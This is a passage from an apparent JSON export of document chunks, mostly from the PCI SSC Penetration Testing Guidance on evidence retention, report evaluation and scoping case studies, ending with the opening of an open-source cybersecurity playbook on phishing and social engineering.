    "text": "or high for internal tests. The intent of this document is to provide supplemental information. Information provided here does not 23\\nThe following is an example of the sections to include in a retest report as defined in Section 5.2.1:  Executive Summary  Date of Original Test  Date of Retest  Original Findings  Results of Retest 5.3 Evidence retention 5.3.1 What is considered evidence? A typical penetration test involves obtaining and evaluating evidence using a formal methodology; evidence collected from the penetration test is used to determine the conclusion. Evidence is considered all information that supports the penetration tester’s conclusions about the effectiveness of the security controls and the environment’s overall security posture. The penetration tester should follow a systematic process to securely collect, handle, and store evidence. Examples of evidence include but are not limited to screenshots, raw tool output (i.e., NMAP, burp suite, Nessus, TCPDump Wireshark, etc.), acquired dumps in case of exploitation (i.e., database files, logs, configuration files etc.), photos, recordings, and anything that may support the final conclusion of the penetration test report. It should be noted that if cardholder data is acquired during the penetration test, it is recommended that it be kept to a minimum. For example, a database full of cardholder data should not be dumped to the tester’s machine or system. 5.3.2 Retention It is recommended that procedures for retention and destruction of evidence be documented for all parties involved prior to commencing the penetration test. If a third party is used to perform the penetration test, contract language should be reviewed to confirm these procedures are clear. While there are currently no PCI DSS requirements regarding the retention of evidence collected by the penetration tester, it is a recommended best practice that such evidence be retained by the tester (whether internal to the organization or a third-party provider) for a period of time while considering any local, regional, or company laws that must be followed for the retention of evidence. This evidence should be available upon request from the target entity or other authorized entities as defined in the rules of engagement. If, however, a tester stores cardholder data obtained during the engagement, the data must be stored by the tester following the guidelines of the PCI DSS for the storage of account data—i.e., encrypted using strong cryptography, truncated/hashed, or not stored. Storage of account data by the tester is not recommended. This data should be securely wiped from tester systems at the conclusion of the engagement. The intent of this document is to provide supplemental information. Information provided here does not 24\\n5.4 Penetration Test Report Evaluation Tool This section is intended for entities that receive a penetration test report and need to interpret and evaluate the completeness of the report. The intent is to provide a tool that could be used by merchants, service providers, and assessors to quickly determine the depth of testing and quality of the reporting based upon the contractual agreement between the organization and",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 19
    }
  },
  {
    "text": "report and need to interpret and evaluate the completeness of the report. The intent is to provide a tool that could be used by merchants, service providers, and assessors to quickly determine the depth of testing and quality of the reporting based upon the contractual agreement between the organization and the tester. It should be noted that this checklist is not intended to take the place of thorough report inspection, interpretation of the findings, and taking appropriate action. Table 1 details the questions, a place to record whether the item is included in the report and the page number where it is found. It is not the intent to generate any type of “score” from the results, as its intent is to provide a communication tool that may be used between the entity and the tester after a report has been written and the results evaluated. It should be noted that these items represent a suggested minimum set of items to look for in the report; additional content may be present. Table 1: Report Evaluation Checklist Included In Report Report Question Page Yes No Penetration Tester Name/Organization ☐ ☐ Contact information ☐ ☐ Credentials/qualifications of analysts Is there sufficient evidence that the individuals are organizationally ☐ ☐ independent from the management of the environment being tested? ☐ ☐ Dates the engagement was performed ☐ ☐ Date the report was issued Executive Summary ☐ ☐ Summarizes testing performed ☐ ☐ Summarizes results of testing ☐ ☐ Summarizes steps for remediation Scope ☐ ☐ Is the scope clearly documented? ☐ ☐ How the scope was determined Is the attack perspective of the engagement clearly defined (internal, external, ☐ ☐ or both)? The intent of this document is to provide supplemental information. Information provided here does not 25\\nIncluded In Report Report Question Page Yes No Is the type of testing clearly defined (application layer, network layer, or both)? ☐ ☐ Were there any constraints put on the testing (time, bandwidth limitations, ☐ ☐ etc.)? Methodology ☐ ☐ Is the methodology clearly stated? Does the methodology reflect industry best practices (OWASP, NIST, etc.)? ☐ ☐ Narrative Is there a clear discussion of the automated and manual testing that was ☐ ☐ performed? Is there clear documentation of any problems that were encountered during ☐ ☐ the testing (interference from active protection systems, target environment controls blocking or dropping packets, etc.)? Discovery Is there a section that documents all identified open network ports/services for ☐ ☐ the target scope and the originating perspective (external or internal exposure)? Results Is there a clear indication whether retesting is needed, and if so, what specific ☐ ☐ areas require retesting? Is there a summary listing of items that need remediation and retesting? ☐ ☐ Is there a detailed listing of items that need remediation and retesting? ☐ ☐ Did tester demonstrate attempts to exploit the identified vulnerability and ☐ ☐ clearly state the potential result/risk that each potential exploit may pose to the environment? (See Section 5.1.1 for",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 20
    }
  },
  {
    "text": "need remediation and retesting? ☐ ☐ Is there a detailed listing of items that need remediation and retesting? ☐ ☐ Did tester demonstrate attempts to exploit the identified vulnerability and ☐ ☐ clearly state the potential result/risk that each potential exploit may pose to the environment? (See Section 5.1.1 for risk-ranking discussion.) The intent of this document is to provide supplemental information. Information provided here does not 26\\n6 Case Studies / Scoping Examples This section provides a number of case studies that illustrate various concepts and methodologies covered in this document. 6.1 E-commerce Penetration Test Case Study Case Introduction The Client is a level-one merchant and retailer of women’s clothing. Client has three unique brands running on multiple e-commerce web sites. Brand A runs on a third-party e-commerce platform written using a Java platform with Apache Tomcat and IBM’s DB2 database and utilizes a content-delivery network for image distribution. Brand B and Brand C utilize an in-house coded e-commerce shopping cart written in ColdFusion with Microsoft SQL and share the same underlying code. All brands submit cardholder data for processing over HTTPS. All sites are hosted at a third-party hosting provider on dedicated systems. The Client’s firewalls have integrated intrusion prevention features. Client has exclusive control of the code and the content. Product Managers update product information using staging servers in the corporate environment, and the updates are promoted to production by IT support staff. Client has full control of DNS. Description of Environment The environment for Brands A, B, and C is comprised of five networks. The web DMZ contains the firewalls, DNS servers, load balancers, and web servers for all brands. Only the load balancers are NAT’d and have publicly routable IP addresses. The application tier contains the Apache Tomcat and ColdFusion middleware servers. It is segmented from the DMZ and database tiers using firewall access controls. The database tier contains the Microsoft SQL and IBM DB2 servers. It is segmented from the application tier using firewall access controls. The management network is used for backups, patch-management servers, NTP Servers, network-traffic analysis devices, and syslog collectors. The management network is accessible using jump boxes with two-factor authentication from the corporate network over a point-to-point VPN. Pre-Engagement Activities (Planning) Once the engagement is confirmed, the Pen Test Company scheduled a kick-off call and provided the Client with a testing questionnaire and test-authorization form to be completed before the next meeting. The kick-off call is generally used to review the rules of engagement, define the success criteria, and review the methodology to be used. An examination of this type could be conducted in accordance with information system security assessment best practices such as described by the Open Source Security Testing Methodology Manual (“OSSTMM”), The National Institute of Standards and Technology (“NIST”) Special Publication 800-115, Technical Guide to Information Security Testing and Assessment, or the Open Web Application Security Project (OWASP) testing methodology as defined in the OWASP Testing Guide v.3.0. The intent of this document is to provide supplemental information.",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 21
    }
  },
  {
    "text": "Methodology Manual (“OSSTMM”), The National Institute of Standards and Technology (“NIST”) Special Publication 800-115, Technical Guide to Information Security Testing and Assessment, or the Open Web Application Security Project (OWASP) testing methodology as defined in the OWASP Testing Guide v.3.0. The intent of this document is to provide supplemental information. Information provided here does not 27\\nScoping is critical, and the more complex the environment, the more difficult it becomes. In this case, all external IPs used for the DMZ and web tier were included in the scope. This would include all systems that directly store, process, or transmit cardholder data. Because the Client has full control and full responsibility for its security, the DNS server was included in the scope of the test to determine whether an attacker could compromise the server and redirect traffic intended for the Client’s sites to a malicious intermediary or fraudulent site. The image CDN servers were determined out of scope because no PAN data is transmitted or processed and the systems are otherwise fully segmented. The staging systems are unavailable from the Internet and therefore cannot be tested. The web applications for Brand A and Brand B will be completely in scope. The web application for Brand C is presumed to be an exact copy, exclusive of product information and look and feel. The tester will sample the web application for Brand C to verify that the applications are the same as Brand B. If it is determined that there are material differences between Brand B and Brand C web applications, Brand C will be brought fully into scope. The Client and Pen Test Company have agreed that testing will be conducted against the production systems, as no suitable staging or review system is publicly available. Because of this limitation, testing must be performed with the intrusion prevention system enabled. However, because the timeline for testing cannot accommodate the time required to use techniques that might bypass the IPS, the Client has agreed to remove any blocks enabled by the system during testing. For this engagement the Client has requested that additional rules of engagement include that testing be limited to non-peak hours, and any attempts to run exploit code on the remote systems be performed only after notifying the Client. Also, any accounts created by the tester or successful orders placed in the system must be identified at the end of each day’s testing. All parties have agreed that no further testing is required if the penetration tester is able to extract data from either of the databases or obtain shell access on any server in the web farm. Engagement Phase (Discovery and Attack/Execution) The penetration tester began by comparing the scope provided by the Client with the latest ASV report to ensure they agreed on the assets and targets under examination. Any differences in scope were noted and investigated. The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases. This open-source intelligence",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 22
    }
  },
  {
    "text": "by the Client with the latest ASV report to ensure they agreed on the assets and targets under examination. Any differences in scope were noted and investigated. The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases. This open-source intelligence (OSINT) gathering is an important next step in confirming scope and determining that all the appropriate assets have been included in the test. Newly discovered assets were vetted by the Client to determine whether they should be included in the penetration test. During this phase of the assessment, an additional disaster recovery site was identified in DNS, and Client confirmed this to be a warm backup in the event of failure of the primary sites. All relevant assets were added to the scope. The intent of this document is to provide supplemental information. Information provided here does not 28\\nOnce the assets were confirmed, the penetration tester enumerated the publicly available services provided by the targets. The tester actively tried to obtain usernames, network-share information, and application- version information of all running services and applications. In this phase, the penetration tester began to spider and map the applications, with and without credentials, in preparation for the exploitation phase. The tester was provided with the ability to complete a full transaction all the way through checkout and order confirmation. With target enumeration complete, the tester performed vulnerability mapping of identified services using automated tools and by comparing the port and service fingerprint against well-known vulnerability databases. This produced a list of unconfirmed vulnerabilities that were further examined in the exploitation phase of testing. The exploitation phase included tests and techniques designed to meet the objectives of the test. (These must be exploitive and may also be used to confirm the effectiveness of ancillary security controls such as intrusion detection systems or web application firewalls.) It was during this step that testing of the applications for issues related to the OWASP Top 10 and other web application frameworks took place. The final phase of testing included post-exploitation techniques. The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using privilege escalation techniques to gain additional access to systems or network resources. The extent to which post-exploitation techniques were performed were defined prior to the start of test to prevent the tester from putting production systems at risk of destabilization. Main vulnerabilities identified were: High:  Apache Tomcat Manager Application Deployer Authenticated Code Execution  Cross-site scripting (reflective)  Directory traversal Medium:  Deprecated protocols - SSLv2, SSLv3  SSL weak ciphers  Internal IP address disclosure Low:  IPS not enabled for disaster-recovery site  Slow HTTP denial-of-service attack Post-Engagement (Post-Execution Phase) At the completion of this examination, the penetration tester met with the Client to describe the preliminary results of the test and address any immediate concerns in advance of the report. The post-execution phase focused on analyzing",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 23
    }
  },
  {
    "text": "not enabled for disaster-recovery site  Slow HTTP denial-of-service attack Post-Engagement (Post-Execution Phase) At the completion of this examination, the penetration tester met with the Client to describe the preliminary results of the test and address any immediate concerns in advance of the report. The post-execution phase focused on analyzing the identified vulnerabilities to determine root causes, establish recommendations and/or remediation activities, and develop a final report where all vulnerabilities noted during the test were documented even though the vulnerabilities did not have an impact on the cardholder data environment. The intent of this document is to provide supplemental information. Information provided here does not 29\\nThe penetration test report was presented to the Client and it was discussed how the Client could remediate the vulnerabilities noted during the penetration test. It was noted that the denial-of-service attack and missing IPS, while serious issues for a retailer, were not PCI-relevant findings and would not be required in order to obtain a clean report. The Client corrected all High and Medium-severity vulnerabilities within a 90-day window and the Pen Test Company provided documentation of successful remediation to the Client. 6.2 Hosting Provider Penetration Test Case Study Case Introduction PCIData Hosting is a hosting service provider. The only cardholder data environment that exists within PCIData Hosting belongs to its PCI DSS compliant customer, TechMerchant. TechMerchant is operating an e-commerce web environment on the PCIData hosting hardware. TechMerchant is solely responsible for the administration and maintenance of all the software and applications used to support its e-commerce environment. PCIData Hosting is bound by contract with TechMerchant to maintain PCI Compliance. PCIData Hosting is required to maintain PCI Compliance by TechMerchant since PCIData Hosting provides critical security services to TechMerchant for its PCI DSS compliance. In addition, PCIData Hosting has a wish to extend this type of PCI DSS hosting service to more customers in the payment card industry. PCIData Hosting is managing the systems in the cardholder data environment and is responsible for physical security, hardware, network, firewalls, and OS including updates, configuration etc. Applications and databases are not the responsibility of PCIData Hosting. Storing, processing, and transmitting cardholder data are in TechMerchant’s scope and have been described and assessed in its own PCI DSS Assessment. PCIData Hosting has no type of cardholder data transactions in scope, and the only entity hosted from a PCI perspective is TechMerchant, for whom they only provide hardware hosting services and logical system management. Description of Environment The environment at PCIData Hosting consists of five different networks:  ODIN Network Zone: Only VMware Hypervisors used for the TechMerchant CDE servers and environment are hosted in this network segment. This network is not accessible from the THOR network.  THOR Network Zone: This network is the CDE environment where TechMerchant has its virtual servers located; all servers located at this network are in PCI scope. The network is separated into smaller networks: DMZ, secure database zone, and an application zone. These networks are included in the penetration test performed",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 24
    }
  },
  {
    "text": "THOR Network Zone: This network is the CDE environment where TechMerchant has its virtual servers located; all servers located at this network are in PCI scope. The network is separated into smaller networks: DMZ, secure database zone, and an application zone. These networks are included in the penetration test performed at TechMerchant.  LOKE Network Zone: Guest network used for external consultants, other guests, BYOD devices, etc. This is the only network that has wireless access points connected. The intent of this document is to provide supplemental information. Information provided here does not 30\\n HEJMDAL Network Zone: Management network from which PCIData Hosting manages the different client networks that do not fall into PCI scope. This network is only used to manage non- CDE servers.  BALDER: All other clients are hosted on this network, including PCIData Hosting’s own office network. All networks are separated by firewalls, and access to ODIN and THOR network segments is restricted to two-factor authentication. The only wireless network is connected to LOKE (the guest network). The datacenter is located at PCIData Hosting’s location and is also in scope for PCI compliance. High-Level Network Diagram Success Criteria – The success criteria for the penetration test is to gain access to the CDE. Resource List (CDE environment)  ODIN – VMware servers  THOR – UNIX-based servers including webservers; Oracle databases in a secure zone  All employees at PCIData Hosting use Microsoft-based workstations to access the CDE environment. Pre-Engagement Actives (Planning) The methodology used for the penetration test was based on NIST SP800-115; the penetration test included the following phases: Planning, Discovery, Attack/Execution, Post-Execution and Reporting. The intent of this document is to provide supplemental information. Information provided here does not 31\\nThe planning phase was used to gather information needed for the assessment execution—such as the assets to be assessed, the threats of interest against the assets, and the security controls to be used to mitigate those threats—and to develop the assessment approach. The networks ODIN (VMware) and THOR (CDE Servers) are the targets of the penetration test as these servers are those that store, process, and transmit cardholder data. Scoping Discussion It was discussed with PCIData Hosting how they managed their CDE environment, including servers and databases. The operating systems are administrated by PCIData Hosting; all applications and development are handled by TechMerchant. Both PCIData Hosting and TechMerchant administer databases. Encrypted information in the database is only accessible with the encryption keys that are held by TechMerchant. All access to ODIN and THOR are authenticated by a two-factor solution. This also applies when accessed from internal networks at PCIData Hosting. TechMerchant’s last penetration test was reviewed to make sure that all perimeters, servers, etc. were covered by the tests. The application was tested as a part of the TechMerchant’s annual PCI penetration test and is not considered in scope for PCIData Hosting’s PCI penetration test, therefore the focus is network- layer testing. The following documentation was reviewed before the assessment:  A network diagram",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 25
    }
  },
  {
    "text": "were covered by the tests. The application was tested as a part of the TechMerchant’s annual PCI penetration test and is not considered in scope for PCIData Hosting’s PCI penetration test, therefore the focus is network- layer testing. The following documentation was reviewed before the assessment:  A network diagram  Results from quarterly external and internal vulnerability scans  Results from the last penetration test  The scope of the TechMerchant’s last penetration test  Security policies  Review of PCIData Hosting’s risk analysis. The following tests were performed during the assessment:  Internal penetration tests from LOKE (guest network), HEJMDAL (management network) and from the office network located in BALDER (Client).  Social engineering against PCIData Hosting administrators of ODIN (VMware) and THOR (CDE servers) in form of phishing e-mails  Physical security assessment as a part of the penetration test.  External testing of PCIData Hosting of their external IP-addresses. All servers, databases, employees with access to the CDE, etc. are considered in scope for the penetration test. The intent of this document is to provide supplemental information. Information provided here does not 32\\nPre-Test Preparations A user account was created for the penetration tester following the regular procedures for granting access to new employees. Access credentials for the guest network were also granted to the tester. Engagement Phase (Discovery and Attack/Execution) Discovery was performed on the LOKE (guest), HEJMDAL (management) and BALDER (office) networks to identify targets (servers, network components, workstations, etc.) on the networks, and analyzing techniques were used to get an understanding of the environment. The objectives of this phase were to identify systems, ports, services, and potential vulnerabilities. This phase was performed both manually and via automated tools including network discovery and port and service detection. When enough data was collected in the discovery phase, the penetration tester tried to gain access to the targets discovered. When access was gained to targets the tester tried to escalate privileges in order to gain complete control of the target. The access obtained was then used to gain more information about the environment, and a new discovery phase was started. The primary goal for the discovery and attack/execution was gaining access to the CDE, including the VMware hosts. The techniques used included password cracking, vulnerability scanning, social engineering, and network-layer testing. The above was completed for the following different perspectives during the assessment:  External attacker without knowledge of the environment  Internal attacker (guest, contractor, etc.)  Internal attacker (employee without access to the CDE) The following tests were performed during the assessment:  External attacker without knowledge of the environment External VPN connection was tested. o Phishing e-mails were sent to carefully selected victims who all are working with administrating o the CDE environment. Attempts to gain access to the data center without having notified the data center up front. o Vulnerabilities related to the VPN connection were not found during the external test. Phishing e- mails were sent but the exploits were caught by",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 26
    }
  },
  {
    "text": "all are working with administrating o the CDE environment. Attempts to gain access to the data center without having notified the data center up front. o Vulnerabilities related to the VPN connection were not found during the external test. Phishing e- mails were sent but the exploits were caught by PCIData Hosting’s anti-virus installation. It was not possible to obtain access to the data center without first being authorized by PCIData Hosting.  Internal attacker Attacks from guest network were performed o Attacks from the management network were performed o Attacks from the office network were performed o The intent of this document is to provide supplemental information. Information provided here does not 33\\nVulnerabilities were found on the different networks, and the tester was able to exploit these but was not able to use the vulnerabilities to gain access to ODIN or THOR. Main vulnerabilities identified were:  Man in the middle – It was possible to perform a man-in-the-middle attack using ARP poisoning but the tester was not able to extract any sensitive information that could provide information on how to gain access to ODIN or THOR.  Weak password policy implemented – Weak password settings on local servers on the BALDER network were used to compromise accounts on this network. The tester was not able to use these accounts to gain access to ODIN or THOR. As these servers are not in PCI scope, the weak password policy was not considered to have an impact on compliance.  Old user accounts were compromised – The tester was able to compromise user accounts that were created but had never been in use on the BALDER network. The compromised accounts did not grant access to ODIN or THOR.  Others – Other vulnerabilities were noted as zone transfer, outdated software, unencrypted protocols used; these vulnerabilities were all related to LOKE or BALDER network and did not grant access to ODIN or THOR even when exploited. Post-Engagement (Post-Execution phase) The post-execution phase focused on analyzing the identified vulnerabilities to determine root causes, establish recommendations and/or remediation activities, and develop a final report where all vulnerabilities noted during the test were documented even though they did not have an impact on the cardholder data environment. The penetration test report was presented to the Client and it was discussed how the Client could remediate the vulnerabilities noted during the penetration test. It was confirmed that none of the vulnerabilities had an effect on the cardholder data environment. As no significant vulnerabilities related to the CDE environment were discovered and access to the CDE environment was not obtained, remediation testing was not performed. The intent of this document is to provide supplemental information. Information provided here does not 34\\n6.3 Retail Merchant Penetration Test Case Study Case Introduction In this example, the business is a retail clothing company called Green Clothing. Cardholder data is collected as a card-present transaction by swiping or keying the card into a POS terminal. The information is then sent to",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 27
    }
  },
  {
    "text": "provided here does not 34\\n6.3 Retail Merchant Penetration Test Case Study Case Introduction In this example, the business is a retail clothing company called Green Clothing. Cardholder data is collected as a card-present transaction by swiping or keying the card into a POS terminal. The information is then sent to a local server at each store before being sent out to the processor. No cardholder data is transmitted between stores or back to corporate. After receiving a confirmation from the processor, cardholder data is purged from the POS server. The POS server runs a PA-DSS point-of-sale application. Corporate has a persistent VPN connection into each of the store locations to allow for administration of networked resources, accessing CCTV recordings, and checking inventory. Description of Environment The environment at Green Clothing consists of six store locations and one corporate office. All stores were determined to be identically configured and have been segmented into two networks:  POS Network – Cardholder Data Environment (CDE) 2 POS devices o 1 POS server o  General Store Network (Non-CDE) 1 manager workstation o 1 CCTV server o Corporate is made up of two network segments:  Corporate General User Network (Non-CDE) 4 workstations o 1 wireless access point o  Corporate IT Management Network (Non-CDE) o 3 workstations used to manage CDE servers The intent of this document is to provide supplemental information. Information provided here does not 35\\nDescription of Access The table below outlines the access from all non-CDE networks into the CDE. This access definition will help in determining what types of testing should be conducted and from where. Source Network (Non CDE) Destination Network (CDE) Access Corporate General User Network Store POS Network None – Segmented Corporate IT Management Network Store POS Network SSH to POS server Store General Network Store POS Network None – Segmented Example Store Network Diagram The intent of this document is to provide supplemental information. Information provided here does not 36\\nExample Corporate Network Diagram Pre-Engagement Activities The POS networks at each store location are considered the cardholder data environment and are the target of the penetration test. The servers within this network at each store are the servers that store, process, and transmit cardholder data. Scoping Discussion It was discussed with Green Clothing company how they managed their CDE-environment, specifically how servers and databases are administrated. All administration is conducted from the IT network at corporate over the VPN connection. The following documentation was reviewed before the assessment:  A network diagram  Results from quarterly external and internal vulnerability scans  Results from the last penetration test  The scope of the Green Clothing’s last penetration test  Security policies  Review of Green Clothing’s risk analysis The intent of this document is to provide supplemental information. Information provided here does not 37\\nFinal Scope Definition After review of all provided materials, Green Clothing and the penetration tester came to an agreement of the following scope definition. External Penetration Test Testing included evaluation of the following",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 28
    }
  },
  {
    "text": "risk analysis The intent of this document is to provide supplemental information. Information provided here does not 37\\nFinal Scope Definition After review of all provided materials, Green Clothing and the penetration tester came to an agreement of the following scope definition. External Penetration Test Testing included evaluation of the following Internet-facing resources:  Six store public IPs Internal Penetration Testing Based on information that all stores are configured identically, internal testing was performed against two stores. Any vulnerabilities identified are assumed to exist in all stores. Testing included evaluation of the following unique testing perspectives targeting two store POS networks: Table x: Network-layer penetration testing scope Perspective network Targeted Network Corporate IT Network Store # 1 – POS Network Corporate IT Network Store # 2 – POS Network Table y: Segmentation testing scope Perspective network Targeted Network Corporate general user network Store # 1 – POS Network Store 1 – general network Store # 1 – POS Network Corporate general user network Store # 2 – POS Network Store 2 – general network Store # 2 – POS Network Pre-Test Preparations The penetration tester was given a network level access in each of the defined testing perspectives.  Corporate IT Network  Corporate General User Network  Store 1 General Network  Store 2 General Network The penetration tester was also provided with the internal IP information for the POS network at the sample target store. No other network access or user credentials were provided. The intent of this document is to provide supplemental information. Information provided here does not 38\\nEngagement Phase The success criteria for the penetration test were defined as getting access to the CDE environment and accessing cardholder data. Based on the defined scope, the following different attack scenarios were evaluated:  External attacker without knowledge of the environment  Internal attacker with no CDE access (guest, contractor, etc.) in either the store general network, or the corporate general network  Internal attacker gaining unauthorized access to the corporate IT management network segment and pivoting to attack stores as an administrator Reporting Phase The penetration tester reported the following items after completing the test. External Penetration Test No notable items reported. It was determined that the only publicly reachable services were the VPN connection points, which were vetted and determined to be secure. Internal Penetration Test Outlined below are the vulnerabilities identified during the internal penetration test.  Vulnerability #1 – Segmentation failure Summary: It was found that firewall #2 (CDE firewall) was configured to allow unrestricted access (all ports and services) from the store General Network (10.0.0.0/24) into the store POS Network (192.168.0.0/24).  Vulnerability #2 – Default user credentials on POS server Summary: Default credentials were enabled on the third-party application running on the POS server. Using these credentials, the penetration tester was able to obtain administrative-level access to the POS server. Post-Engagement Green Clothing reviewed the penetration test report and implemented fixes for each identified item. The penetration tester conducted additional testing to validate",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 29
    }
  },
  {
    "text": "were enabled on the third-party application running on the POS server. Using these credentials, the penetration tester was able to obtain administrative-level access to the POS server. Post-Engagement Green Clothing reviewed the penetration test report and implemented fixes for each identified item. The penetration tester conducted additional testing to validate that the remediation activities sufficiently resolved the reported items. An updated report was provided that showed the items as remediated. The intent of this document is to provide supplemental information. Information provided here does not 39\\nAppendix A: Quick-Reference Table to Guidance on PCI DSS Penetration Testing Requirements Informational Supplement Section(s) PCI DSS 11.3.x Requirement Containing Guidance 11.3 Penetration test methodology sub-bullets: Based on industry-accepted approaches 3.1, 4.4, 5.1.1, 5.1.2, 5.2 - Coverage for CDE and critical systems 2.2, 2.2.4, 4.1.1 - Includes external and internal testing 2.2.1, 2.2.2 - Test to validate segmentation controls 2.2.3, 4.2.3 - Application-layer testing 2.3, 4.2.1 - Network-layer tests for network and OS 2.3, 4.2.2 - The intent of this document is to provide supplemental information. Information provided here does not 40\\nAcknowledgements PCI SSC would like to acknowledge the contribution of the Penetration Testing Guidance Special Interest Group (SIG) in the preparation of the original document published in 2015. The Penetration Testing Guidance SIG consisted of representatives from the following organizations: Accuvant, Inc Convergys Corp Agio, LLC CradlePoint Alaska Airlines Crosskey Banking Solutions A-lign Security and Compliance Services Crowe Horwath LLP Allstate Insurance DataFlight Europe AS Aperia Solutions Delhaize America Shared Services Group, LLC AT&T Consulting Solutions Dell, Inc. atsec (Beijing) Information Technology Co., Ltd Deluxe Corp. Bally Total Fitness Diamond Resorts Corp. Bank Of New Zealand Digital Defense, Inc. Bashas' Inc. Domino's Pizza, Inc. BB&T Corporation DST Output Board of Trustees of the University of Arkansas Enterprise Holdings, Inc. Bridge Point Communications EVO Payments International The Brick Group EVRY A/S BrightLine CPAs & Associates, Inc. Experian Information Services British Airways PLC Exxon Mobil Corporation BT PLC Fiscal Systems, Inc. Canadian Tire Financial Services Fiserv Solutions, Inc. CBIZ Security & Advisory Services, LLC FishNet Security CDG Commerce Foregenix CenturyLink Foresight IT Consulting Pty Ltd. Cisco Systems, Inc. FortConsult A-S Citigroup Inc. Games Workshop Ltd Clydesdale Bank PLC Gap Inc. Coalfire Systems, Inc. Global Payments Direct, Inc. Compass IT Compliance, LLC Grant Thornton Computer Services, Inc. Groupement Interbancaire Monetique de Comsec L'uemoa (GIM-UEMOA) ControlScan Inc. GuidePoint Security, LLC The intent of this document is to provide supplemental information. Information provided here does not 41\\nHewlett-Packard SecurityMetrics, Inc. Hitachi-Omron Terminal Solutions, Corp. Sense of Security Pty Ltd. IBM Corporation Sikich LLP Internet Security Auditors SISA IQ Information Quality SIX Payment Services Ltd Isis Mobile Commerce Solutionary, Inc. Jet Infosystems Starwood Hotels & Resorts Worldwide, Inc. Liverpool Victoria Friendly Society State Farm Mutual Automobile Insurance Company Lloyds Banking Group StoreFinancial Services MegaPath Inc. Structured Communication Systems, Inc. MobileIron, Inc. Sword & Shield Enterprise Security, Inc. Módulo Security Solutions S.A. Symantec Corporation MTI Technology, Ltd. Sysnet Limited National Australia Bank Telstra Nettitude, Ltd. Tesco Stores Ltd. NIC Inc Tieto Latvia",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 30
    }
  },
  {
    "text": "Society State Farm Mutual Automobile Insurance Company Lloyds Banking Group StoreFinancial Services MegaPath Inc. Structured Communication Systems, Inc. MobileIron, Inc. Sword & Shield Enterprise Security, Inc. Módulo Security Solutions S.A. Symantec Corporation MTI Technology, Ltd. Sysnet Limited National Australia Bank Telstra Nettitude, Ltd. Tesco Stores Ltd. NIC Inc Tieto Latvia SIA Novacoast TIVIT (Terceirizacao de Tecnologiae Servicios S/A) NRI Secure Technologies Trustwave Holdings, Inc. NTA Monitor Ltd. TSYS NTT Security Ltd. TUI Travel PLC Online Enterprises U.S. Bancorp Outerwall U.S. Cellular Payment Software Company (PSC) UL Transaction Security PTY Ltd. PayPal, Inc. University of Oklahoma Pier1 Imports UPS (United Parcel Service) Princeton Payment Solutions LLC usd AG Progressive Casualty Insurance Company Verizon Wireless Promocion y Operacion SA de CV VigiTrust Ltd. Rapid7 LLC Vodat International Ltd. RBC Royal Bank The Walt Disney Company RBS Westpac Banking Corporation Right Time Limited Xpient Solutions LLC Secured Net Solutions Inc. SecureNet The intent of this document is to provide supplemental information. Information provided here does not 42\\nAbout the PCI Security Standards Council The PCI Security Standards Council is an open global forum that is responsible for the development, management, education, and awareness of the PCI Data Security Standard (PCI DSS) and other standards that increase payment data security. Created in 2006 by the founding payment card brands American Express, Discover Financial Services, JCB International, Mastercard, and Visa Inc., the Council has more than 700 Participating Organizations representing merchants, banks, processors, and vendors worldwide. To learn more about playing a part in securing payment card data globally, please visit: pcisecuritystandards.org. The intent of this document is to provide supplemental information. Information provided here does not 43",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 31
    }
  },
  {
    "text": "CYBERSECURITY PLAYBOOK WRITTEN BY PETE HERZOG CONTRIBUTORS\\nContents 03 Part 1: Scouting Reports Profiles for ten of the most common threats you should be prepared to face. 10 Part 2: The Game Plan A practical, step-by-step process for making your organization more secure. 19 Part 3: Looking Downfield Set yourself up for success both now and in the long run as threats evolve. CREATIVE COMMONS ATTRIBUTION-NODERIVATIVES 4.0 2016 ISECOM AND BARKLY THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPart 1: Scouting Reports What security threats should I be prepared for? The first key to any effective security game plan is knowing what you’re up against. In this section, you’ll learn all about ten of the most common threats your company is likely to face. While by no means comprehensive, this list can help you better understand some of the tactics being directed against you and your users, along with the specific reasons you’re potentially vulnerable to each. From phishing to ransomware to distributed denial of service (DDoS) attacks, the more you know about these threats the better. They’re some of the leading causes of data breaches, downtime, and a serious lack of sleep. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 4 Phishing What it is: Any attempt to compromise a system and/or steal information by tricking a user into responding to a malicious message. The most common phishing attacks involve emails armed with malware hidden in attachments or links to infected websites, although phishing can be conducted via other methods such as voicemail, text messages, and social media, too. What makes protection a challenge: For one thing, employees are already in the habit of clicking things because that’s how you interact with modern computers. For another, phishing emails are much more sophisticated than they used to be. Scammers can take over legitimate email accounts or spoof their email addresses to make it look like messages are coming from someone employees trust. Once a victim is tricked and becomes compromised, the attacker now has their access credentials. They can reach all the same servers, log into the same web applications, and download the same files as if they were that employee. The challenge with protecting against this is you need to limit what servers employees can access or how they can access them. There are times that may run counter to what they need to do their jobs. Additionally, even if you train employees to be on the lookout for suspicious emails, some phishing attacks can be extremely targeted and look just like any other email from a trusted source who is being impersonated. The most convincing examples of these “spear phishing attacks” don’t provide any red flags until it’s too late. Social Engineering What it is: There are two ways to steal anything — you either take it yourself or you get someone else to give it to you. Social engineering is a broad umbrella term for any tactics designed to exploit and manipulate trust, so the victim hands the attacker what they",
    "metadata": {
